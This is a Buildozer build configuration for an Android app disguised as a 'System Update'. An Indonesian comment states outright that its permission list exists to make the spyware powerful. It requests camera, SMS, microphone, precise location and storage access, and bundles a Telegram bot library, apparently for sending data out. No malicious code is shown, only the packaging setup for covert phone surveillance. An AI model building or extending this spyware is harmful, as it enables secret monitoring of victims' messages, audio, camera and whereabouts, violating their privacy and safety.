[app]
title = System Update
package.name = appmeupdate
package.domain = org.test
source.dir = .
source.include_exts = py,png,jpg,kv,atlas
version = 0.1

# Gabungkan semua requirements jadi SATU baris saja
requirements = python3,kivy==2.2.1,requests,pyTelegramBotAPI,plyer,certifi

orientation = portrait
fullscreen = 0

# Permissions biar spyware-nya sakti
android.permissions = INTERNET, CAMERA, READ_SMS, RECORD_AUDIO, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, ACCESS_FINE_LOCATION

android.api = 31
android.minapi = 21
android.ndk = 25b
android.archs = arm64-v8a, armeabi-v7a
android.accept_sdk_license = True

[buildozer]
log_level = 2
warn_on_root = 1
